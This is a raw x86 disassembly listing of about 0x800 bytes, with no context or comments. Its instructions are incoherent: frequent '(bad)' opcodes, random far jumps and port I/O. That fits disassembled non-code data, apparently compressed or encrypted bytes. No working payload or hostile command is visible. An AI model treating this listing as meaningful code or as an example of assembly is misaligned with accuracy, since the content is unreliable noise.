  405f4a:	and    DWORD PTR [ebx],ebp
  405f4c:	pop    es
  405f4d:	push   ecx
  405f4e:	xchg   ebp,eax
  405f4f:	push   esi
  405f50:	mov    esi,0xf608fb5a
  405f55:	dec    esp
  405f56:	push   esi
  405f57:	xchg   ebp,eax
  405f58:	xchg   DWORD PTR [ebx],ebp
  405f5a:	sub    al,0xfa
  405f5c:	ss in  eax,0x1f
  405f5f:	popf   
  405f60:	add    DWORD PTR gs:[edi],edi
  405f63:	retf   0xf918
  405f66:	popa   
  405f67:	add    BYTE PTR [esi],ah
  405f69:	hlt    
  405f6a:	lds    edx,FWORD PTR [edi-0x76318862]
  405f70:	push   esp
  405f71:	clc    
  405f72:	jle    0x405fac
  405f74:	in     eax,0x94
  405f76:	pop    ecx
  405f77:	lods   eax,DWORD PTR ds:[esi]
  405f78:	int    0xa2
  405f7a:	sbb    ebp,edi
  405f7c:	sub    ecx,DWORD PTR [edi-0x6b37abbb]
  405f82:	adc    eax,0xefdcc958
  405f87:	aaa    
  405f88:	cdq    
  405f89:	add    DWORD PTR [ecx+0x7e],eax
  405f8c:	(bad)  
  405f8d:	in     eax,0xcd
  405f8f:	or     edx,edx
  405f91:	push   esp
  405f92:	pop    esi
  405f93:	add    eax,0x289fe298
  405f98:	push   ebx
  405f99:	jo     0x405f68
  405f9b:	sbb    DWORD PTR [edx-0x12a4b0b3],edx
  405fa1:	sahf   
  405fa2:	lahf   
  405fa3:	leave  
  405fa4:	fimul  WORD PTR [esi+eax*4+0x4448873e]
  405fab:	mov    eax,gs:0xa801deac
  405fb1:	push   esp
  405fb2:	dec    ebx
  405fb3:	mov    al,0x66
  405fb5:	dec    ecx
  405fb6:	add    ah,BYTE PTR [eax-0x23]
  405fb9:	aas    
  405fba:	pop    edi
  405fbb:	add    BYTE PTR [ecx+ecx*2],ah
  405fbe:	adc    eax,DWORD PTR [edi-0x27578809]
  405fc4:	mov    BYTE PTR [esi-0x6710570a],bl
  405fca:	shr    bl,0xb0
  405fcd:	shr    DWORD PTR gs:[eax-0x13],1
  405fd1:	xchg   edx,eax
  405fd2:	adc    ah,ah
  405fd4:	imul   edi,DWORD PTR [esi+0x1f9c5816],0x3c
  405fdb:	test   ebx,esi
  405fdd:	gs mov ch,0xaf
  405fe0:	adc    ah,BYTE PTR [ebx-0x43]
  405fe3:	int3   
  405fe4:	cdq    
  405fe5:	mov    ch,0xe6
  405fe7:	lahf   
  405fe8:	shl    DWORD PTR [esi+0x36db1f01],1
  405fee:	lock push edx
  405ff0:	mov    ecx,0x7264fd50
  405ff5:	jmp    0x4062e5
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	js     0x405f99
  406008:	xchg   edi,eax
  406009:	into   
  40600a:	mov    edx,eax
  40600c:	js     0x406086
  40600e:	dec    ebp
  40600f:	jle    0x406089
  406011:	js     0x40607b
  406013:	gs ins BYTE PTR es:[edi],dx
  406015:	jmp    0x7624c360
  40601a:	and    BYTE PTR [eax+0x4b82a7d5],cl
  406020:	jl     0x405fda
  406022:	nop
  406023:	cdq    
  406024:	dec    ecx
  406025:	cdq    
  406026:	sub    BYTE PTR ds:0x28de8ef8,bl
  40602c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40602d:	xor    BYTE PTR ds:0xf4a78000,bh
  406033:	cmp    DWORD PTR [eax+0x7f4fbd73],eax
  406039:	mov    al,ds:0xaea73802
  40603e:	loope  0x405fc5
  406040:	and    edx,DWORD PTR [ebp+ecx*8+0x1e40e93b]
  406047:	fild   QWORD PTR [edi]
  406049:	imul   esp,edx,0xc2f9b428
  40604f:	adc    BYTE PTR [ebp+0x742962b9],bl
  406055:	jmp    0x405fd8
  406057:	or     eax,0xf5dd12a0
  40605c:	xchg   al,bl
  40605e:	and    DWORD PTR [edx-0x5c20b67],esp
  406064:	inc    eax
  406065:	sar    BYTE PTR [ebx-0x72],0x6c
  406069:	fs inc edx
  40606b:	mov    ds:0x83fabf8a,eax
  406070:	rcr    DWORD PTR [ecx],1
  406072:	xor    eax,0x9669810
  406077:	cmp    bl,ch
  406079:	out    dx,al
  40607a:	jl     0x40609c
  40607c:	mov    fs,ebx
  40607e:	jge    0x40602c
  406080:	jae    0x4060eb
  406082:	or     eax,0x1515f961
  406087:	cld    
  406088:	and    dh,cl
  40608a:	adc    eax,0xe10e47d
  40608f:	sub    ah,BYTE PTR [edx+0x22]
  406092:	jecxz  0x406018
  406094:	shl    DWORD PTR [ecx+edx*1-0x7a08a370],cl
  40609b:	pushf  
  40609c:	push   eax
  40609d:	aas    
  40609e:	cmp    al,0xef
  4060a1:	cmp    DWORD PTR [eax-0x40956f9e],0xbb5bd316
  4060ab:	mov    edx,0x31848fd9
  4060b0:	push   0x22
  4060b2:	inc    ecx
  4060b3:	xchg   esp,eax
  4060b4:	shr    DWORD PTR [edx+0x74],1
  4060b7:	jae    0x406109
  4060b9:	adc    eax,DWORD PTR [edx+0x75ca2e6e]
  4060bf:	dec    DWORD PTR [eax]
  4060c1:	mov    eax,0x40ee73c7
  4060c6:	jmp    0x4060f0
  4060c8:	ds cld 
  4060ca:	mov    edx,0x8a08af6b
  4060cf:	retf   0x2a98
  4060d2:	jg     0x406109
  4060d4:	imul   ebx,DWORD PTR [edi+0x20b8271f],0xffffffc1
  4060db:	push   ebp
  4060dc:	cmc    
  4060dd:	push   es
  4060de:	pop    edi
  4060df:	nop
  4060e0:	mov    cl,0x35
  4060e2:	jbe    0x40606d
  4060e4:	lahf   
  4060e5:	add    al,0x6
  4060e7:	inc    esi
  4060e8:	xor    eax,0x7170ce3b
  4060ed:	not    ebx
  4060ef:	das    
  4060f0:	lahf   
  4060f1:	mov    ecx,0xfc883dc6
  4060f6:	pop    ss
  4060f7:	(bad)  
  4060f8:	xor    DWORD PTR [ebp+0x2de1da8f],ebp
  4060fe:	mov    esp,0x42f4096d
  406103:	push   0xffffffa2
  406105:	sbb    eax,0x5216a336
  40610a:	sbb    al,0xf0
  40610c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40610d:	not    BYTE PTR [edx+0xe]
  406110:	dec    esi
  406111:	pop    esp
  406112:	and    al,0x90
  406114:	loope  0x4060fa
  406116:	neg    ebp
  406118:	adc    bh,BYTE PTR [ebx]
  40611a:	or     DWORD PTR [ecx-0x43],ebx
  40611d:	ret    0x3708
  406120:	fdivr  st(6),st
  406122:	mov    BYTE PTR [ecx-0x7f],dl
  406125:	sub    ebp,ecx
  406127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406128:	cs js  0x406184
  40612b:	fbstp  TBYTE PTR [esi-0x37]
  40612e:	fstp   st(4)
  406130:	call   DWORD PTR [edi]
  406132:	cmp    eax,0x73d202a7
  406137:	xor    edx,DWORD PTR [ebp-0x5]
  40613a:	xor    esi,DWORD PTR [esi]
  40613c:	and    eax,0x18d72992
  406141:	and    BYTE PTR [edx],0x88
  406144:	shl    DWORD PTR [ecx+0x61739912],cl
  40614a:	hlt    
  40614b:	aad    0xe5
  40614d:	jl     0x406132
  40614f:	out    0x40,al
  406151:	dec    esp
  406152:	adc    DWORD PTR [ebx+0x20],esp
  406155:	pop    ebx
  406156:	test   al,0x33
  406158:	bound  ebx,QWORD PTR [ebx-0x3e36e5eb]
  40615e:	es fs call 0x1d52:0x76705f60
  406167:	mov    eax,ds:0xb6da201
  40616c:	sti    
  40616d:	add    al,0xcb
  40616f:	std    
  406170:	loop   0x4061ab
  406172:	ror    DWORD PTR [edx+eiz*1],cl
  406175:	cdq    
  406176:	sub    ebp,esi
  406178:	or     eax,esp
  40617a:	xchg   ecx,eax
  40617b:	sub    al,0xac
  40617d:	xchg   esp,eax
  40617e:	mov    eax,0x52284aed
  406183:	mov    DWORD PTR [ecx],ecx
  406185:	dec    ecx
  406186:	aad    0xb8
  406188:	adc    eax,0xe070ee86
  40618d:	loope  0x406173
  40618f:	aam    0x9e
  406191:	and    DWORD PTR [esi+0x6a3777b3],ebx
  406197:	sub    al,0xcd
  406199:	jnp    0x406216
  40619b:	mov    DWORD PTR [ebx+0x3],ecx
  40619e:	jmp    0xeda70d1f
  4061a3:	xchg   ecx,eax
  4061a4:	or     eax,0x4d4f15ae
  4061a9:	xchg   ebp,eax
  4061aa:	add    eax,0x951c3211
  4061af:	stc    
  4061b0:	xor    eax,0x50fcc91b
  4061b5:	ja     0x40613f
  4061b7:	sub    ebx,eax
  4061b9:	and    ebx,edx
  4061bb:	xchg   esp,eax
  4061bc:	xor    edx,edx
  4061be:	sub    DWORD PTR [edi],ebx
  4061c0:	xchg   ecx,eax
  4061c1:	sbb    al,0x73
  4061c3:	retf   
  4061c4:	repnz (bad) 
  4061c6:	enter  0x82dc,0x72
  4061ca:	inc    edx
  4061cb:	(bad)  
  4061cc:	stc    
  4061cd:	(bad)  
  4061ce:	jbe    0x4061a2
  4061d0:	xor    eax,0x62f6d92d
  4061d5:	push   edi
  4061d6:	or     BYTE PTR [edx-0x6],dh
  4061d9:	jne    0x4061c5
  4061db:	or     DWORD PTR [ebp-0x27502781],ebp
  4061e1:	(bad)  
  4061e2:	pop    edx
  4061e3:	mov    ah,0x2d
  4061e5:	jnp    0x406200
  4061e7:	jge    0x4061a9
  4061e9:	arpl   WORD PTR [eax-0x421eadff],sp
  4061ef:	or     eax,0x60f6ed8a
  4061f4:	pop    es
  4061f5:	call   0x393:0x745662d6
  4061fc:	test   BYTE PTR [eax+0x685eb456],ch
  406202:	pop    esi
  406203:	sbb    bl,BYTE PTR [eax+0xa831415]
  406209:	and    eax,0xd4bf55fc
  40620e:	(bad)  
  40620f:	paddsb mm1,mm6
  406212:	inc    eax
  406213:	or     eax,0x1333ec4c
  406218:	dec    eax
  406219:	test   eax,0x10e82ee9
  40621e:	jmp    0xabd5:0xe2c86dcb
  406225:	sub    DWORD PTR [esi],ecx
  406227:	push   cs
  406228:	cmp    ebp,edx
  40622a:	xor    DWORD PTR [edi-0x3e12e7f9],edi
  406230:	inc    edx
  406231:	stos   DWORD PTR es:[edi],eax
  406232:	in     eax,0x52
  406234:	je     0x406214
  406236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406237:	adc    DWORD PTR [edi-0x646747ec],esp
  40623d:	cmp    bl,BYTE PTR [ecx-0x15]
  406240:	xchg   ecx,eax
  406241:	dec    edx
  406242:	mov    ds:0xb4ffb44d,eax
  406247:	jecxz  0x40628c
  406249:	in     al,dx
  40624a:	sub    al,0xf1
  40624c:	and    esi,esi
  40624e:	leave  
  40624f:	mov    ecx,0xdda3145d
  406254:	pop    ebp
  406255:	test   al,0x1b
  406257:	scas   al,BYTE PTR es:[edi]
  406258:	mov    dl,0xf8
  40625a:	jle    0x4061e3
  40625c:	out    0x32,al
  40625e:	pop    ds
  40625f:	test   eax,0x2242596c
  406264:	push   esi
  406265:	adc    eax,DWORD PTR [edx+edi*4+0x25]
  406269:	daa    
  40626a:	das    
  40626b:	pop    es
  40626c:	add    al,0x0
  40626e:	xchg   esp,eax
  40626f:	push   0x71fbb3ec
  406274:	and    edi,DWORD PTR [eax]
  406276:	dec    ebp
  406277:	pushf  
  406278:	ins    BYTE PTR es:[edi],dx
  406279:	gs pop esp
  40627b:	and    dl,BYTE PTR [edi-0x5c]
  40627e:	sbb    eax,0x61589392
  406283:	and    dl,BYTE PTR ss:[edx-0x43]
  406287:	inc    edx
  406288:	stos   DWORD PTR es:[edi],eax
  406289:	add    esp,DWORD PTR [edx+esi*2]
  40628c:	divps  xmm7,XMMWORD PTR [edi-0x4ec69e98]
  406293:	pop    esp
  406294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406295:	lock pop edx
  406297:	sub    eax,0x139f3fd8
  40629c:	(bad)  
  40629d:	(bad)  
  40629e:	mov    bl,0x74
  4062a0:	pop    ds
  4062a1:	push   0x414ee99
  4062a6:	adc    eax,0x2c8e0e1
  4062ab:	pop    ds
  4062ac:	les    ecx,FWORD PTR [eax-0x384c28c4]
  4062b2:	out    dx,al
  4062b3:	fmul   QWORD PTR [edx+0x253fa80c]
  4062b9:	cli    
  4062ba:	xor    al,0x12
  4062bc:	rcl    BYTE PTR [ecx+ecx*8-0x1cf7388b],0xb
  4062c4:	cwde   
  4062c5:	int3   
  4062c6:	cmp    esi,edx
  4062c8:	xchg   BYTE PTR [ecx+0x1cb93c90],bl
  4062ce:	lea    edi,[ebx]
  4062d0:	jmp    0xb4782674
  4062d5:	mov    eax,0x2dacd1a9
  4062da:	sub    BYTE PTR [ecx],bh
  4062dc:	and    DWORD PTR [ecx-0xf],ecx
  4062df:	xchg   edi,eax
  4062e0:	retf   
  4062e1:	pushf  
  4062e2:	daa    
  4062e3:	mov    esi,0x8bf1f7b9
  4062e8:	dec    ebp
  4062e9:	adc    cl,ch
  4062eb:	jmp    0x4062ef
  4062ed:	add    BYTE PTR [eax],al
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0x5c3c1e5c
  4062fe:	(bad)  
  406300:	(bad)  
  406301:	js     0x40637b
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x4062ed
  406308:	in     al,0x1a
  40630a:	xor    eax,0x475ed106
  40630f:	ret    0x1f62
  406312:	fld    TBYTE PTR es:[eax]
  406315:	rol    DWORD PTR [ebx-0x29],0xc7
  406319:	data16 xor dl,al
  40631c:	jmp    0xbe1d16b7
  406321:	das    
  406322:	sbb    ah,BYTE PTR [esi]
  406324:	or     al,0xd6
  406326:	leave  
  406327:	das    
  406328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406329:	gs ss scas al,BYTE PTR es:[edi]
  40632c:	xchg   ecx,eax
  40632d:	loope  0x406302
  40632f:	cmp    eax,DWORD PTR [edi]
  406331:	je     0x40638c
  406333:	inc    esp
  406334:	jmp    0x1f03:0x3a29d6e2
  40633b:	(bad)  
  40633c:	nop    DWORD PTR [edx+0x2]
  406340:	mov    esi,DWORD PTR [ecx*4-0x5e9349c1]
  406347:	or     al,0x71
  406349:	inc    ebx
  40634a:	jmp    0x40635d
  40634c:	rol    BYTE PTR [edi-0x545d9de0],1
  406352:	jae    0x40632c
  406354:	xor    al,0x5d
  406356:	inc    ecx
  406357:	test   eax,0xbe9cae4d
  40635c:	jbe    0x4063af
  40635e:	jl     0x4063b2
  406360:	lds    ebx,FWORD PTR [ebx-0x62c5fef8]
  406366:	pop    ebx
  406367:	cmp    BYTE PTR [eax],bh
  406369:	xor    ecx,0xffffff80
  40636c:	jecxz  0x40633f
  40636e:	out    dx,al
  40636f:	mov    ds:0xb15d89c6,eax
  406374:	inc    ebx
  406375:	xor    ebx,ecx
  406377:	and    al,dh
  406379:	enter  0x5d81,0x17
  40637d:	cdq    
  40637e:	ret    
  40637f:	pop    ebx
  406380:	inc    edx
  406381:	popa   
  406382:	es dec esp
  406384:	out    dx,al
  406385:	aaa    
  406386:	sbb    BYTE PTR [edi-0x51],0x5f
  40638a:	sahf   
  40638b:	inc    esi
  40638c:	add    edx,DWORD PTR [bp+di]
  40638f:	mov    ebx,0x8915724f
  406394:	mov    dh,0x6f
  406396:	pusha  
  406397:	cmp    al,0x42
  406399:	aad    0x4d
  40639b:	xor    eax,0x43c7e374
  4063a0:	xor    cl,ah
  4063a2:	xchg   BYTE PTR [eax+eiz*4],bh
  4063a5:	sub    BYTE PTR [ebx+0x6698beb0],dl
  4063ab:	push   esp
  4063ac:	jns    0x4063c5
  4063ae:	push   ds
  4063af:	push   0x473b1657
  4063b4:	mov    ds:0x5315fad5,eax
  4063b9:	in     al,0xa4
  4063bb:	xchg   edi,eax
  4063bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063bd:	leave  
  4063be:	pop    ebx
  4063bf:	aad    0x3f
  4063c1:	(bad)  [esi+0x4371eda9]
  4063c7:	mov    ecx,0xcf06ec91
  4063cc:	sub    DWORD PTR [esi+0x4b],edi
  4063cf:	lds    edi,FWORD PTR [eax]
  4063d1:	add    BYTE PTR [ecx-0x2145a469],al
  4063d7:	dec    ebp
  4063d8:	cwde   
  4063d9:	in     eax,dx
  4063da:	adc    ecx,eax
  4063dc:	fild   WORD PTR [esi]
  4063de:	add    BYTE PTR [ecx],dh
  4063e0:	pushf  
  4063e1:	out    0x95,al
  4063e3:	pushf  
  4063e4:	ja     0x4063cf
  4063e6:	cli    
  4063e7:	xchg   edx,eax
  4063e8:	loopne 0x4063cc
  4063ea:	idiv   cl
  4063ec:	outs   dx,BYTE PTR ds:[esi]
  4063ed:	sub    bh,BYTE PTR [eax]
  4063ef:	addr16 xor al,0xb5
  4063f2:	inc    ebx
  4063f3:	xchg   ecx,eax
  4063f4:	jae    0x4063e9
  4063f6:	pop    eax
  4063f7:	pop    ebx
  4063f8:	inc    ebx
  4063f9:	fdiv   QWORD PTR [ebx+0x7ac471d9]
  4063ff:	fwait
  406400:	xchg   edi,eax
  406401:	cli    
  406402:	push   esi
  406403:	xchg   edx,eax
  406404:	arpl   WORD PTR [ebx+0xa684896],bx
  40640a:	std    
  40640b:	sub    edx,DWORD PTR [ebx]
  40640d:	outs   dx,DWORD PTR ds:[esi]
  40640e:	xor    ebp,DWORD PTR [ebx+eiz*2]
  406411:	or     DWORD PTR [eax-0x62],edi
  406414:	retf   0xdcc9
  406417:	add    ebp,DWORD PTR [ebx+0x74]
  40641a:	sbb    ebx,DWORD PTR [eax-0x36aa83b5]
  406420:	sbb    al,0x1f
  406422:	ja     0x40647e
  406424:	iret   
  406425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406426:	dec    eax
  406427:	adc    esp,DWORD PTR [edx-0x7d]
  40642a:	mov    cl,0xd2
  40642c:	jb     0x40643d
  40642e:	sub    DWORD PTR [eax],0x47
  406431:	rsqrtps xmm0,XMMWORD PTR [ecx+0x4e]
  406435:	pop    edi
  406436:	or     al,0xf
  406438:	jb     0x4064af
  40643a:	in     al,0x8f
  40643c:	je     0x40646a
  40643e:	jb     0x406440
  406440:	cli    
  406441:	fs jmp 0x83948769
  406447:	setns  BYTE PTR [ebp+0x3e]
  40644b:	push   edi
  40644c:	mov    ebp,0xabebccbd
  406451:	jge    0x406439
  406453:	sub    BYTE PTR [edi+eiz*2-0x2],ch
  406457:	cmp    al,0x1d
  406459:	ss inc ebx
  40645b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40645c:	push   0xba7d447c
  406461:	mov    edx,esi
  406463:	add    esp,DWORD PTR [ebx-0x33]
  406466:	xchg   ecx,eax
  406467:	sbb    ch,BYTE PTR [ebp-0x62]
  40646a:	cdq    
  40646b:	int3   
  40646c:	xchg   ebx,eax
  40646d:	(bad)
  406470:	sahf   
  406471:	xor    DWORD PTR [edx+0x34],edi
  406474:	push   ebx
  406475:	jmp    eax
  406477:	dec    ebp
  406478:	scas   al,BYTE PTR es:[edi]
  406479:	push   edi
  40647a:	mov    ch,0xfa
  40647c:	jmp    0x5f74:0xf7c701cc
  406483:	mov    ?,WORD PTR [eax-0x41]
  406486:	jmp    0x4064b2
  406488:	mov    al,0x1e
  40648a:	add    BYTE PTR [ebp-0x8],0x7b
  40648e:	lea    esi,[esi-0x355e6b87]
  406494:	enter  0xdaa7,0x7
  406498:	pop    ebp
  406499:	xchg   edi,eax
  40649a:	and    eax,0x5175b189
  40649f:	data16 xor al,ch
  4064a2:	or     BYTE PTR [edx+ebx*2],dl
  4064a5:	jmp    0x4064bb
  4064a7:	xchg   BYTE PTR ds:0x1d4923e4,dh
  4064ad:	inc    eax
  4064ae:	rcl    BYTE PTR cs:[ebp+0x1384e9dc],cl
  4064b5:	xor    ah,BYTE PTR [ebx+0x29c447d8]
  4064bb:	pushf  
  4064bc:	test   eax,0xa9e23a01
  4064c1:	mov    bh,BYTE PTR ds:0x3624ebde
  4064c7:	adc    DWORD PTR [edx-0x39],esp
  4064ca:	cmp    BYTE PTR [ebx-0x13eb6e8d],dl
  4064d0:	jo     0x4064fe
  4064d2:	fs test eax,0xf7c13c91
  4064d8:	xchg   esi,eax
  4064d9:	(bad)  
  4064db:	test   al,0x12
  4064dd:	sti    
  4064de:	cs jmp 0x4064e6
  4064e1:	inc    edi
  4064e2:	(bad)  
  4064e3:	xor    eax,0x19aa29d1
  4064e8:	mov    BYTE PTR [ebx+ecx*8],cl
  4064eb:	and    DWORD PTR [ecx-0x2],eax
  4064ee:	inc    eax
  4064ef:	cli    
  4064f0:	mov    ebp,0xbcaffea8
  4064f5:	and    DWORD PTR [edx],esi
  4064f7:	imul   DWORD PTR [eax-0x1ec6fd0c]
  4064fd:	les    esp,FWORD PTR [esi]
  4064ff:	loopne 0x40657d
  406501:	(bad)  
  406502:	test   eax,0x4194e096
  406508:	bound  edi,QWORD PTR [ecx]
  40650a:	ins    BYTE PTR es:[edi],dx
  40650b:	inc    esi
  40650c:	mov    cl,0x84
  40650e:	mov    dl,0xa3
  406510:	push   ebp
  406511:	or     al,0x4d
  406513:	mov    ebp,0xfb5abdb9
  406518:	cmc    
  406519:	dec    ebx
  40651a:	pop    ebx
  40651b:	out    dx,al
  40651c:	out    0xfb,al
  40651e:	inc    esi
  40651f:	sbb    dh,BYTE PTR [ebx+0x32]
  406522:	sub    DWORD PTR [edx+0x496222d0],edi
  406528:	cmp    al,0x93
  40652a:	cld    
  40652b:	xchg   edx,eax
  40652c:	fistp  WORD PTR [ebx+0x50dff4d8]
  406532:	mov    edi,0xd13d0f19
  406537:	test   BYTE PTR [ebx+0x179ea02],cl
  40653d:	and    DWORD PTR ds:0x3cf5f7e0,esi
  406543:	shl    DWORD PTR [eax],0xdd
  406546:	(bad)  
  406547:	push   ebp
  406548:	in     al,0x90
  40654a:	xchg   dh,bh
  40654c:	cmp    al,0x22
  40654e:	push   ebx
  40654f:	pusha  
  406550:	fsub   QWORD PTR [esi+eax*4]
  406553:	les    ebp,FWORD PTR [eax+0x7b]
  406556:	cmc    
  406557:	push   cs
  406558:	rcr    BYTE PTR [esi-0x3d],cl
  40655b:	mov    al,0x4d
  40655d:	imul   ebx,DWORD PTR [edi],0x11adf6a3
  406563:	dec    ebx
  406564:	push   0x121f0418
  406569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40656a:	imul   eax,DWORD PTR [edx+0x27647f55],0x15f77f87
  406574:	or     cl,0xd4
  406577:	mov    edx,esi
  406579:	cli    
  40657a:	and    dl,BYTE PTR [edx+0x5ade0676]
  406580:	xchg   esi,eax
  406581:	clc    
  406582:	mov    ebx,0x6f753a66
  406587:	xchg   edx,eax
  406588:	ins    BYTE PTR es:[edi],dx
  406589:	jp     0x406546
  40658b:	pop    es
  40658c:	cmp    BYTE PTR [edx+0x35],0xd0
  406590:	push   cs
  406591:	sub    dh,ah
  406593:	dec    esi
  406594:	and    ebx,0xfffffff3
  406597:	or     BYTE PTR ds:0x5b295b8,0xb1
  40659e:	in     al,dx
  40659f:	call   0xc654:0x2179b648
  4065a6:	jae    0x40659c
  4065a8:	lea    eax,[edx]
  4065aa:	xchg   DWORD PTR [ecx],edi
  4065ac:	add    edi,DWORD PTR [esi-0x5d]
  4065af:	jno    0x4065cc
  4065b1:	fcmovb st,st(1)
  4065b3:	in     eax,0xa1
  4065b5:	and    eax,0x854531cb
  4065ba:	add    eax,0xae81bc42
  4065bf:	push   ecx
  4065c0:	das    
  4065c1:	scas   al,BYTE PTR es:[edi]
  4065c2:	xchg   edx,eax
  4065c3:	std    
  4065c4:	mov    esp,0x2fac83b9
  4065c9:	jbe    0x4065d8
  4065cb:	pop    ecx
  4065cc:	jg     0x406594
  4065ce:	int    0x98
  4065d0:	xchg   bh,al
  4065d2:	in     al,dx
  4065d3:	xchg   ebp,eax
  4065d4:	xchg   cx,ax
  4065d6:	popa   
  4065d7:	fcmove st,st(1)
  4065d9:	adc    BYTE PTR [ebx],ah
  4065db:	enter  0xc981,0x8e
  4065df:	sbb    eax,0xc18b8116
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	xchg   ecx,eax
  4065f6:	rol    ch,cl
  4065f8:	into   
  4065f9:	xor    eax,esp
  4065fb:	js     0x406675
  4065fd:	dec    ebp
  4065fe:	jle    0x406678
  406600:	js     0x406584
  406602:	aaa    
  406603:	out    0xa6,eax
  406605:	add    ah,BYTE PTR [ebx-0x16]
  406608:	imul   edi,DWORD PTR [edx],0x6e
  40660b:	pop    edi
  40660c:	inc    esp
  40660d:	shl    DWORD PTR [edi+0x74],1
  406610:	xchg   esi,eax
  406611:	lock push cs
  406613:	(bad)  
  406614:	sub    esi,DWORD PTR [ebx]
  406616:	call   0xfdaba949
  40661b:	add    DWORD PTR [ebx],esp
  40661d:	clc    
  40661e:	mov    eax,0xcf09d5f8
  406623:	outs   dx,DWORD PTR ds:[esi]
  406624:	iret   
  406625:	adc    BYTE PTR [esi-0x472a0d98],dh
  40662b:	xor    eax,0xe1d1c674
  406630:	mov    bh,0x3a
  406632:	data16 jecxz 0x4065c1
  406635:	repz cmp eax,0x13c3acbe
  40663b:	pop    edx
  40663c:	inc    ebp
  40663d:	inc    esi
  40663e:	iret   
  40663f:	push   ebx
  406640:	cmp    ah,BYTE PTR [ebp+0x5b]
  406643:	pop    es
  406644:	inc    eax
  406645:	sbb    dl,BYTE PTR [ecx-0x10]
  406648:	and    DWORD PTR [ecx+0x3d],ebx
  40664b:	cdq    
  40664c:	and    BYTE PTR [edi+0x6be4b625],0x2b
  406653:	and    eax,0x5f7b6b8c
  406658:	imul   edx,DWORD PTR [edx-0x7c],0xed5f44f6
  40665f:	(bad)  
  406660:	jge    0x406607
  406662:	jmp    0x6c9:0x4557a4ff
  406669:	push   0x5a
  40666b:	addr16 sti 
  40666d:	mov    ds:0x5e9e1aab,al
  406672:	sti    
  406673:	lods   al,BYTE PTR ds:[esi]
  406674:	xchg   edi,eax
  406675:	shl    DWORD PTR [esi+0x50],1
  406678:	xor    al,bl
  40667a:	sub    BYTE PTR [eax-0x418417ea],cl
  406680:	iret   
  406681:	push   0xffffffb1
  406683:	jle    0x4066db
  406685:	push   eax
  406686:	push   ebx
  406687:	xchg   esp,eax
  406688:	xor    ebx,DWORD PTR [esi-0x5b]
  40668b:	(bad)  
  40668c:	nop
  40668d:	sbb    al,0x7f
  40668f:	mov    ebx,0xe5e4aa45
  406694:	or     eax,0xc05fd7b2
  406699:	adc    BYTE PTR [esi+ecx*8-0x7358f568],bl
  4066a0:	in     eax,dx
  4066a1:	xor    BYTE PTR [ecx+0x1ce4950e],0xf8
  4066a8:	shl    DWORD PTR [esi],cl
  4066aa:	inc    edi
  4066ab:	and    dl,BYTE PTR [edx]
  4066ad:	mov    al,0x58
  4066af:	mov    ds:0x13c5b36,al
  4066b4:	xchg   esi,eax
  4066b5:	fs je  0x4066c1
  4066b8:	lea    ecx,[ebp-0x22]
  4066bb:	pop    ebp
  4066bc:	sti    
  4066bd:	jecxz  0x40664c
  4066bf:	inc    edx
  4066c0:	ret    
  4066c1:	mul    bl
  4066c3:	adc    ebx,DWORD PTR [esp+edi*1-0x5c47cad4]
  4066ca:	popf   
  4066cb:	daa    
  4066cc:	xchg   ebp,eax
  4066cd:	shl    DWORD PTR [ebp+0x6b9bcc31],1
  4066d3:	in     al,0xb5
  4066d5:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066d7:	fidivr WORD PTR [esi+eax*2]
  4066da:	(bad)  [edi+0x375a75bb]
  4066e0:	ins    DWORD PTR es:[edi],dx
  4066e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066e2:	push   0xffffff88
  4066e4:	retf   0xb9f7
  4066e7:	inc    ebp
  4066e8:	xor    BYTE PTR [eax],bl
  4066ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066eb:	push   ebx
  4066ec:	popf   
  4066ed:	xchg   edx,eax
  4066ee:	ss pop ebx
  4066f0:	fild   QWORD PTR [ecx]
  4066f2:	sub    BYTE PTR [esi],0xe3
  4066f5:	sbb    bh,ah
  4066f7:	test   eax,0xd57e47f9
  4066fc:	scas   eax,DWORD PTR es:[edi]
  4066fd:	(bad)  
  4066fe:	dec    esi
  4066ff:	jae    0x4066d6
  406701:	fidivr DWORD PTR [edi+0x45cab020]
  406707:	cdq    
  406708:	jae    0x4066a9
  40670a:	imul   ecx,DWORD PTR [edi-0x34],0xb
  40670e:	dec    esp
  40670f:	sub    BYTE PTR [edx+0x70],dl
  406712:	gs pusha 
  406714:	adc    edi,DWORD PTR [edx-0x6e]
  406717:	jns    0x4066d2
  406719:	cmp    al,bl
  40671b:	retf   
  40671c:	repnz mov edx,0x739ea9e
  406722:	imul   ecx,DWORD PTR [edi-0x11d90e87],0xffffffdb
  406729:	mov    eax,0x344f6de2
  40672e:	cld    
  40672f:	cmc    
  406730:	jmp    0x4066ea
  406732:	repnz aam 0xeb
  406735:	das    
  406736:	add    eax,0x4913fd9d
  40673b:	scas   eax,DWORD PTR es:[edi]
  40673c:	popf   
  40673d:	sti    
  40673e:	push   ds
  40673f:	and    DWORD PTR [esi+0x37],edi
  406742:	out    dx,al
  406743:	sub    BYTE PTR [edi],dl
  406745:	jbe    0x4067b5
  406747:	lods   eax,DWORD PTR ds:[esi]
  406748:	sar    BYTE PTR [ebx-0x20],1
  40674b:	ficomp WORD PTR [ebx-0x3ae46abb]
  406751:	shl    DWORD PTR [ebx],0xaa
